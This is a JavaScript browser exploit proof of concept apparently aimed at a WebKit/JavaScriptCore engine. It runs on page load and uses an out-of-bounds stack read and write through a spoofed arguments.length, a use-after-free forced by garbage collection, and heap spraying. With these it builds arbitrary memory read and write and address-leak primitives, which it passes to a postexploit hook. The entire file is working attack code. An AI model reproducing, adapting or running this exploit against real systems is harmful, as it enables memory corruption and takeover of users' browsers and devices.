/* Set up variables that will be used later on */
var _dview;

/*
  Zero out a buffer
*/
function zeroFill( number, width )
{
  width -= number.toString().length;
  if ( width > 0 )
  {
    return new Array( width + (/\./.test( number ) ? 2 : 1) ).join( '0' ) + number;
  }
  return number + ""; // always return a string
}

/*
  Int64 library for address operations
*/
function int64(low,hi) {
  this.low = (low>>>0);
  this.hi = (hi>>>0);
  this.add32inplace = function(val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    this.hi=new_hi;
    this.low=new_lo;
  }
  this.add32 = function(val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    return new int64(new_lo, new_hi);
  }
  this.sub32 = function(val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }
    return new int64(new_lo, new_hi);
  }
  this.sub32inplace = function(val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }
    this.hi=new_hi;
    this.low=new_lo;
  }
  this.and32 = function(val) {
    var new_lo = this.low & val;
    var new_hi = this.hi;
    return new int64(new_lo, new_hi);
  }
  this.and64 = function(vallo, valhi) {
    var new_lo = this.low & vallo;
    var new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  }
  this.toString = function(val) {
    val = 16; // eh
    var lo_str = (this.low >>> 0).toString(val);
    var hi_str = (this.hi >>> 0).toString(val);
    if(this.hi == 0) return lo_str;
    else {
      lo_str = zeroFill(lo_str, 8)
    }
    return hi_str+lo_str;
  }
  this.toPacked = function() {
    return {hi: this.hi, low: this.low};
  }
  this.setPacked = function(pck) {
    this.hi=pck.hi;
    this.low=pck.low;
    return this;
  }

  return this;
}

var memPressure = new Array(400);   // For forcing GC via memory pressure
var stackFrame  = [];               // Our fake stack in memory
var frameIndex  = 0;                // Set index in fake stack to 0 (0xFF00)
var stackPeek   = 0;

/* Force garbage collection via memory pressure */
var doGarbageCollection = function()
{
  /* Apply memory pressure */
  for (var i = 0; i < memPressure.length; i++)
  {
    memPressure[i] = new Uint32Array(0x10000);
  }

  /* Zero out the buffer */
  for (var i = 0; i < memPressure.length; i++)
  {
    memPressure[i] = 0;
  }
}

/* For peeking the stack (reading) */
function peek_stack()
{
  var mem;
  var retno;
  var oldRetno;

  /* Set arguments.length to return 0xFFFF on first call, and 1 on subsequent calls */
  retno = 0xFFFF;

  arguments.length =
  {
    valueOf: function()
    {
      oldRetno = retno;
      retno = 1;
      return oldRetno;
    }
  }

  /*
    What this essentially does is when function.prototype.apply() is called, it will
    check arguments length. Where it should return 1 (the actual size), it actually
    returns 0xFFFF due to the function above. This allows an out-of-bounds read
    on the stack, and allows us to control uninitialized memory regions
  */
  var args = arguments;

  (function() {
    (function() {
      (function() {
        mem = arguments[0xFF00];
      }).apply(undefined, args);
    }).apply(undefined, stackFrame);
  }).apply(undefined, stackFrame);

  stackPeek = mem;

  return mem;
}

/* For poking the stack (writing) */
function poke_stack(val)
{
  /* Set stack frame value @ frameIndex */
  stackFrame[frameIndex] = val;

  /* Apply to uninitialized memory region on the stack */
  (function() {
    (function() {
      (function() {
      }).apply(null, stackFrame);
    }).apply(null, stackFrame);
  }).apply(null, stackFrame);

  /* Clear value in stack frame @ frameIndex as it's been applied already */
  stackFrame[frameIndex] = "";
}

/* Run exploit PoC */
function run() {
  try
  {
    /*
      Set each integer in the stackframe to it's index, this way we can peek
      the stack to align it
    */
    for(var i = 0; i < 0xFFFF; i++)
    {
      stackFrame[i] = i;
    }

    /*
      Attempt to poke and peek the stack. If the peek returns null, it means
      the out-of-bounds read failed, throw an exception and catch it.
    */
    frameIndex = 0;
    poke_stack(0);

    if (peek_stack() == undefined) {
      throw "System is not vulnerable!";
    }

    /* Setup our stack frame so our target object reference resides inside of it */
    frameIndex = 0;
    poke_stack(0);

    peek_stack();
    frameIndex = stackPeek;

    /* Align the stack frame */
    poke_stack(0x4141);

    for (var align = 0; align < 8; align++)
      (function(){})();

    /* Test if we aligned our stack frame properly, if not throw exception and catch */
    peek_stack();

    if (stackPeek != 0x4141)
    {
      throw "Couldn't align stack frame to stack!";
    }

    /* Setup spray to overwrite the length header in UAF'd object's butterfly */
    var butterflySpray = new Array(0x1000);

    for (var i = 0; i < 0x1000; i++)
    {
      butterflySpray[i] = [];

      for (var k = 0; k < 0x40; k++)
      {
        butterflySpray[i][k] = 0x42424242;
      }

      butterflySpray[i].unshift(butterflySpray[i].shift());
    }

    /* Spray marked space */
    var sprayOne = new Array(0x100);

    for (var i = 0; i < 0x100; i++)
    {
      sprayOne[i] = [1];

      if (!(i & 3))
      {
        for (var k = 0; k < 0x8; k++)
        {
          sprayOne[i][k] = 0x43434343;
        }
      }

      sprayOne[i].unshift(sprayOne[i].shift());
    }

    var sprayTwo = new Array(0x400);

    for (var i = 0; i < 0x400; i++)
    {
      sprayTwo[i] = [2];

      if (!(i & 3))
      {
        for (var k = 0; k < 0x80; k++)
        {
          sprayTwo[i][k] = 0x43434343;
        }
      }

      sprayTwo[i].unshift(sprayTwo[i].shift());
    }

    /* Setup target object for UAF, spray */
    var uafTarget = [];

    for (var i = 0; i < 0x80; i++) {
      uafTarget[i] = 0x42420000;
    }

    /* Store target on the stack to maintain a reference after forced garbage collection */
    poke_stack(uafTarget);

    /* Remove references so they're free'd when garbage collection occurs */
    uafTarget = 0;
    sprayOne = 0;
    sprayTwo = 0;

    /* Force garbage collection */
    for (var k = 0; k < 4; k++)
      doGarbageCollection();

    /* Re-collect our maintained reference from the stack */
    peek_stack();
    uafTarget = stackPeek;

    stackPeek = 0;

    /*
      We now have access to uninitialized memory, force a heap overflow by
      overwriting the "length" field of our UAF'd object's butterfly via spraying
    */
    for (var i = 0; i < 0x1000; i++)
    {
      for (var k = 0x0; k < 0x80; k++)
      {
        butterflySpray[i][k] = 0x7FFFFFFF;

        /*
          Find our UAF'd object via modified length, which should be the maximum
          value for a 32-bit integer. If it is, we've successfully primitive our
          butterfly's length header!
        */
        if (uafTarget.length == 0x7FFFFFFF)
        {
          /* Store index of butterfly for UAF'd object for primitiveSpray */
          var butterflyIndex = i;

          /* Remove all references except what we need to free memory */
          for (var i = 0; i < butterflyIndex; i++)
            butterflySpray[i] = 0;

          for (var i = butterflyIndex + 1; i < 0x1000; i++)
            butterflySpray[i] = 0;

          doGarbageCollection();

          /* Spray to obtain a read/write primitive */
          var primitiveSpray = new Array(0x20000);
          var potentialPrim = new ArrayBuffer(0x1000);

          for (var i = 0; i < 0x20000; i++)
          {
            primitiveSpray[i] = i;
          }

          var overlap = new Array(0x80);

          /* Setup potential uint32array slaves for our read/write primitive */
          for (var i = 0; i < 0x20000; i++)
          {
            primitiveSpray[i] = new Uint32Array(potentialPrim);
          }

          /* Find a slave uint32array from earlier spray */
          var currentQword  = 0x10000;
          var found         = false;
          var smashedButterfly  = new int64(0,0);
          var origData          = new int64(0, 0);
          var locateHelper      = new int64(0, 0);

          while (!found)
          {
            /*
              Change qword value for uint32array size to 0x1337 in UAF'd object
              to defeat U-ASLR
            */
            var savedVal = uafTarget[currentQword];
            uafTarget[currentQword] = 0x1337;

            /* Check sprayed uint32array slaves for modified size */
            for (var i = 0; i < 0x20000; i++)
            {
              if (primitiveSpray[i] && primitiveSpray[i].byteLength != 0x1000)
              {
                /*
                  Found our primitive! Restore uint32array size as 0x1000 is
                  sufficient.
                */
                uafTarget[currentQword] = savedVal;

                var primitive = primitiveSpray[i];
                var overlap = [1337];

                uafTarget[currentQword - 5] = overlap;

                smashedButterfly.low  = primitive[2];
                smashedButterfly.hi   = primitive[3];
                smashedButterfly.keep_gc = overlap;

                /* Find previous ArrayBufferView */
                uafTarget[currentQword - 5] = uafTarget[currentQword - 2];

                butterflySpray[butterflyIndex][k] = 0;

                origData.low = primitive[4];
                origData.hi  = primitive[5];

                primitive[4]  = primitive[12];
                primitive[5]  = primitive[13];
                primitive[14] = 0x40;

                /* Find our uint32array slave for writing values */
                var slave = undefined;

                for (var k = 0; k < 0x20000; k++)
                {
                  if (primitiveSpray[k].length == 0x40)
                  {
                    slave = primitiveSpray[k];
                    break;
                  }
                }

                if(!slave)
                  throw "Could not find slave for write primitive!";

                /* Set primitive address to that of the smashed butterfly's */
                primitive[4] = smashedButterfly.low;
                primitive[5] = smashedButterfly.hi;

                /* Setup primitive and slave for primitive functions */
                overlap[0] = uafTarget;

                var targetEntry = new int64(slave[0], slave[1]);

                primitive[4] = targetEntry.low;
                primitive[5] = targetEntry.hi;
                slave[2]     = 0;
                slave[3]     = 0;

                /* Clear references for future collection from GC */
                uafTarget = 0;
                primitiveSpray = 0;

                /* Finally restore primitive address to it's original state */
                primitive[4] = origData.low;
                primitive[5] = origData.hi;

                /*
                  Derive primitive functions
                */

                /* Purpose: Leak object addresses for ASLR defeat */
                var leakval = function(obj)
                {
                  primitive[4] = smashedButterfly.low;
                  primitive[5] = smashedButterfly.hi;

                  overlap[0] = obj;

                  var val = new int64(slave[0], slave[1]);

                  slave[0] = 1337;
                  slave[1] = 0xffff0000;

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;

                  return val;
                }

                /* Purpose: Create a value (used for checking the primitive) */
                var createval = function(val)
                {
                  primitive[4] = smashedButterfly.low;
                  primitive[5] = smashedButterfly.hi;

                  slave[0] = val.low;
                  slave[1] = val.hi;

                  var val = overlap[0];

                  slave[0] = 1337;
                  slave[1] = 0xffff0000;

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;

                  return val;
                }

                /* Purpose: Read 32-bits (or 4 bytes) from address */
                var read32 = function(addr)
                {
                  primitive[4] = addr.low;
                  primitive[5] = addr.hi;

                  var val = slave[0];

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;

                  return val;
                }

                /* Purpose: Read 64-bits (or 8 bytes) from address */
                var read64 = function(addr)
                {
                  primitive[4] = addr.low;
                  primitive[5] = addr.hi;

                  var val = new int64(slave[0], slave[1]);

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;

                  return val;
                }

                /* Purpose: Write 32-bits (or 4 bytes) to address */
                var write32 = function(addr, val)
                {
                  primitive[4] = addr.low;
                  primitive[5] = addr.hi;

                  slave[0] = val;

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;
                }

                /* Purpose: Write 64-bits (or 8 bytes) to address */
                var write64 = function(addr, val)
                {
                  primitive[4] = addr.low;
                  primitive[5] = addr.hi;

                  if (val == undefined)
                  {
                    val = new int64(0,0);
                  }
                  if (!(val instanceof int64))
                  {
                    val = new int64(val,0);
                  }

                  slave[0] = val.low;
                  slave[1] = val.hi;

                  primitive[4] = origData.low;
                  primitive[5] = origData.hi;
                }

                if (createval(leakval(0x1337)) != 0x1337) {
                  throw "Primitive is broken, jsvalue leaked does not match jsvalue created!";
                }

                var testData = [1,2,3,4,5,6,7,8];

                var testAddr = leakval(testData);

                var butterflyAddr = read64(testAddr.add32(8));

                if ((butterflyAddr.low == 0 && butterflyAddr.hi == 0) || createval(read64(butterflyAddr)) != 1) {
                  throw "Primitive is broken, either butterfly address is null or object is not a valid jsvalue!";
                }

                if (window.postexploit) {
                  window.postexploit({
                    read4: read32,
                    read8: read64,
                    write4: write32,
                    write8: write64,
                    leakval: leakval,
                    createval: createval
                  });
                }
                return 2;
              }
            }
            uafTarget[currentQword] = savedVal;
            currentQword ++;
          }
        }
      }
    }
    /*
      If we ended up here, the exploit failed to find our resized object/we were
      not able to modify the UaF'd target's length :(
    */
    return 1;
  }
  catch (e)
  {
    alert(e);
  }
}

//window.onload = function() { document.getElementById("clck").innerHTML = '<a href="javascript:run()">go</a>'; };
window.onload = function() { run(); };